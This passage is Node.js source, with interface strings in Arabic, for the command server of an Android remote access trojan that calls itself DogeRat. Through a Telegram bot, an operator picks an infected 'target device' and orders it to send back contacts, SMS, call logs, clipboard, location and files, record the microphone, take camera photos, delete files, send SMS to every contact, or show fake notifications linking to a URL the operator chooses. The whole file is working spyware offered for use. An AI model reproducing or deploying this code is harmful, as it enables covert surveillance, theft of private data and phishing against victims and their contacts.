            '°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
            '• عندما ينقر الضحية على الإشعار، سيتم فتح الرابط الذي تدخله',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار')) {
        sendToDevice(currentUuid, `show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
        sendToDevice(currentUuid, `play_audio:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
}

function handleCommandMessage(message, chatId) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '°• مرحباً بك في لوحة تحكم Rat\n\n' +
            '• إذا كان التطبيق مثبتاً على الجهاز المستهدف، انتظر الاتصال\n\n' +
            '• عندما تتلقى رسالة الاتصال، فهذا يعني أن الجهاز المستهدف متصل وجاهز لتلقي الأوامر\n\n' +
            '• انقر على زر الأوامر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب من بين الأوامر\n\n' +
            '• إذا علقت في مكان ما في البوت، أرسل أمر /start',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (message.text === 'الأجهزة المتصلة') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة متاحة\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('خطأ:', err.message));
        } else {
            let text = '°• قائمة الأجهزة المتصلة :\n\n';
            appClients.forEach(function (value, key, map) {
                text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                    `• البطارية : <b>${value.battery}</b>\n` +
                    `• إصدار أندرويد : <b>${value.version}</b>\n` +
                    `• سطوع الشاشة : <b>${value.brightness}</b>\n` +
                    `• المزود : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, { parse_mode: "HTML" }).catch(err => console.error('خطأ:', err.message));
        }
    }
    
    if (message.text === 'تنفيذ أمر') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة متاحة\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('خطأ:', err.message));
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key, map) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(id, '°• حدد الجهاز لتنفيذ الأمر', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            }).catch(err => console.error('خطأ:', err.message));
        }
    }
}

function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (!id) return;

    const commandHandlers = {
        'device': () => {
            const deviceInfo = appClients.get(uuid);
            if (!deviceInfo) {
                appBot.sendMessage(id, '°• الجهاز غير موجود أو منفصل').catch(() => {});
                return;
            }
            appBot.editMessageText(`°• حدد أمراً للجهاز : <b>${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'التطبيقات', callback_data: `apps:${uuid}` },
                            { text: 'معلومات الجهاز', callback_data: `device_info:${uuid}` }
                        ],
                        [
                            { text: 'جلب ملف', callback_data: `file:${uuid}` },
                            { text: 'حذف ملف', callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: 'الحافظة', callback_data: `clipboard:${uuid}` },
                            { text: 'الميكروفون', callback_data: `microphone:${uuid}` },
                        ],
                        [
                            { text: 'الكاميرا الرئيسية', callback_data: `camera_main:${uuid}` },
                            { text: 'كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: 'الموقع', callback_data: `location:${uuid}` },
                            { text: 'رسالة توست', callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: 'المكالمات', callback_data: `calls:${uuid}` },
                            { text: 'جهات الاتصال', callback_data: `contacts:${uuid}` }
                        ],
                        [
                            { text: 'اهتزاز', callback_data: `vibrate:${uuid}` },
                            { text: 'إظهار إشعار', callback_data: `show_notification:${uuid}` }
                        ],
                        [
                            { text: 'الرسائل', callback_data: `messages:${uuid}` },
                            { text: 'إرسال رسالة', callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: 'تشغيل صوت', callback_data: `play_audio:${uuid}` },
                            { text: 'إيقاف الصوت', callback_data: `stop_audio:${uuid}` },
                        ],
                        [
                            {
                                text: 'إرسال رسالة لجميع جهات الاتصال',
                                callback_data: `send_message_to_all:${uuid}`
                            }
                        ],
                    ]
                },
                parse_mode: "HTML"
            }).catch(err => console.error('خطأ:', err.message));
        },
        'calls': () => {
            sendToDevice(uuid, 'calls');
            deleteAndSendProcessing(msg.message_id);
        },
        'contacts': () => {
            sendToDevice(uuid, 'contacts');
            deleteAndSendProcessing(msg.message_id);
        },
        'messages': () => {
            sendToDevice(uuid, 'messages');
            deleteAndSendProcessing(msg.message_id);
        },
        'apps': () => {
            sendToDevice(uuid, 'apps');
            deleteAndSendProcessing(msg.message_id);
        },
        'device_info': () => {
            sendToDevice(uuid, 'device_info');
            deleteAndSendProcessing(msg.message_id);
        },
        'clipboard': () => {
            sendToDevice(uuid, 'clipboard');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_main': () => {
            sendToDevice(uuid, 'camera_main');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_selfie': () => {
            sendToDevice(uuid, 'camera_selfie');
            deleteAndSendProcessing(msg.message_id);
        },
        'location': () => {
            sendToDevice(uuid, 'location');
            deleteAndSendProcessing(msg.message_id);
        },
        'vibrate': () => {
            sendToDevice(uuid, 'vibrate');
            deleteAndSendProcessing(msg.message_id);
        },
        'stop_audio': () => {
            sendToDevice(uuid, 'stop_audio');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه\n\n' +
                '• إذا كنت تريد إرسال رسالة نصية قصيرة إلى أرقام محلية، يمكنك إدخال الرقم مع صفر في البداية، وإلا أدخل الرقم مع رمز الدولة',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'send_message_to_all': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
                '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد تحميله\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لاستلام ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'delete_file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'microphone': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n' +
                '• لاحظ أنه يجب عليك إدخال الوقت رقمياً بوحدات الثواني',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'toast': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف\n\n' +
                '• رسالة التوست هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'show_notification': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
                '• ستظهر رسالتك في شريط حالة الجهاز المستهدف مثل الإشعارات العادية',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'play_audio': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
                '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        }
    };

    if (commandHandlers[commend]) {
        commandHandlers[commend]();
    }
}

function sendToDevice(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

function deleteAndSendProcessing(messageId) {
    if (appBot && id) {
        appBot.deleteMessage(id, messageId).catch(() => {});
        sendProcessingMessage();
    }
}

function sendProcessingMessage() {
    if (appBot && id) {
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• ستتلقى رداً في اللحظات القليلة القادمة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
}

// نبضة بقاء الاتصال
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    
    // اختياري: إبقاء الخادم مستيقظاً عن طريق إرسال طلب لخدمة خارجية
    if (address) {
        axios.get(address).catch(() => {
            // تجاهل الأخطاء من الطلب
        });
    }
}, 5000);

// إغلاق آمن
process.on('SIGTERM', () => {
    console.log('تم استلام إشارة SIGTERM: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('تم استلام إشارة SIGINT: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

// بدء الخادم
appServer.listen(PORT, () => {
    console.log(`خادم DogeRat v1.0.0 يعمل على المنفذ ${PORT}`);
    console.log(`ستظهر الأجهزة المتصلة هنا`);
});
